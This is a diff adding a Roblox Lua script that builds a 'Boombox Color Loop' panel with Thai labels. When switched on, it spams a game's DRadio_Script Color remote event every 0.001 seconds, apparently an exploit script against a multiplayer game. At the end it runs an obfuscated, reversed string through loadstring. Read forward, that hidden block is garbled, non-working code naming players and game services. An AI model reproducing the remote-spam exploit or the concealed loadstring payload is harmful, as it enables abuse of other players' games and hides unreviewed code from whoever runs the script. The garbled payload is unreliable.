@@ -1,0 +1,96 @@
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player.PlayerGui)
+gui.Name = "ColorBoomboxUI"
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 250, 0, 150)
+frame.Position = UDim2.new(0, 200, 0, 200)
+frame.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+
+local header = Instance.new("TextLabel", frame)
+header.Size = UDim2.new(1, 0, 0, 30)
+header.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
+header.BorderSizePixel = 0
+header.Text = "Boombox Color Loop"
+header.Font = Enum.Font.Cartoon
+header.TextSize = 20
+header.TextColor3 = Color3.new(0, 0, 0)
+
+local line = Instance.new("Frame", frame)
+line.Size = UDim2.new(1, 0, 0, 2)
+line.Position = UDim2.new(0, 0, 0, 30)
+line.BackgroundColor3 = Color3.new(0, 0, 0)
+line.BorderSizePixel = 0
+
+local credit = Instance.new("TextLabel", frame)
+credit.Size = UDim2.new(0, 100, 0, 20)
+credit.Position = UDim2.new(0, 5, 1, -25)
+credit.BackgroundTransparency = 1
+credit.Text = "By:TOU"
+credit.Font = Enum.Font.Cartoon
+credit.TextSize = 18
+credit.TextColor3 = Color3.new(0, 0, 0)
+credit.TextXAlignment = Enum.TextXAlignment.Left
+
+local toggleButton = Instance.new("TextButton", frame)
+toggleButton.Size = UDim2.new(0, 100, 0, 40)
+toggleButton.Position = UDim2.new(0.5, -50, 0.5, -20)
+toggleButton.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
+toggleButton.BorderSizePixel = 0
+toggleButton.Text = "เปิด"
+toggleButton.Font = Enum.Font.Cartoon
+toggleButton.TextSize = 22
+toggleButton.TextColor3 = Color3.new(1, 1, 1)
+
+local colors = {
+    BrickColor.new(1013),
+    BrickColor.new(331),
+    BrickColor.new(1020),
+    BrickColor.new(1016),
+    BrickColor.new(1009),
+    BrickColor.new(106),
+    BrickColor.new(1015),
+    BrickColor.new(330),
+}
+
+local isOn = false
+
+toggleButton.MouseButton1Click:Connect(function()
+    isOn = not isOn
+    toggleButton.Text = isOn and "ปิด" or "เปิด"
+    toggleButton.BackgroundColor3 = isOn and Color3.fromRGB(200, 100, 100) or Color3.fromRGB(100, 200, 100)
+
+    if isOn then
+        task.spawn(function()
+            while isOn do
+                for _, color in ipairs(colors) do
+                    if not isOn then break end
+                    workspace:WaitForChild("DRadio_Script"):WaitForChild("Color"):FireServer(color)
+                    task.wait(0.001) -- เปลี่ยนความเร็วตรงนี้
+                end
+            end
+        end)
+    end
+end)
+
+
+loadstring(string.reverse([[
+)eslaF(daolnwoD.teG:di3SM.metsySecivreS:emaG=diuS
+"71081640373"=DI_dnuoS
+)"🤑เมฆาเขาตาสู้"(txet.egasseMtxeTdiuS=
+)eurT(elbisiV.egasseMtxeTdiuS=
+)eurT(elbisiV.draoBelbaliSdiuS=
+diuS:gnirts = eman_yeK
+)"2a654321iahT","321_2Vdrib" ni eman_yeK fi( fi
+neht
+)(
+:eman_yalP nruter noitcnuF
+)reyalP,tuo( nruter )reyalP(emane.teG
+)(
+:reyalP rof
+)stsilyaPlortnoC:secivreSemaG(teG:sreyalP
+)(noitcnuf
+)]])()) -- ปิด string.reverse และรันโค้ด
